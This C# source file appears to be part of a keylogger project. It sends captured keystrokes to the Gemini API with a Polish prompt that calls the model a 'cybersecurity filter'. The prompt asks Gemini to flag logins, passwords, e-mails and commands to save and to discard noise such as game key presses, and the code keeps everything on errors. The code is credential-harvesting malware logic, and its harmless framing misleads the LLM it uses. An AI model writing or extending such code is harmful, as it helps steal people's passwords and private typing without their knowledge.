using Ping_Project.Requests;

namespace Ping_Project.Core.Validation;

public static class PasswordValidaton
{
    public static async Task<bool> ToSave(string password, string GeminiApiKey)
    {
        try
        {
            var prompt =
                "Jesteś filtrem cyberbezpieczeństwa. Przeanalizuj poniższy tekst przechwycony z klawiatury. " +
                "Jeśli tekst to przypadkowe znaki (np. 'asdasd'), ruch z gier (np. 'wwasd') lub pojedyncze litery, odpowiedz TYLKO słowem: ODRZUĆ. " +
                "Jeśli tekst zawiera loginy, hasła, e-maile, komendy systemowe lub sensowne zdania, odpowiedz TYLKO słowem: ZAPISZ. Tekst do analizy:" +
                password;

            var respone = await GeminiRequest.AskGemini(GeminiApiKey, prompt);

            Console.WriteLine(respone);

            return respone.ToUpper().Contains("ZAPISZ");
        }
        catch
        {
            return true;
        }
    }
}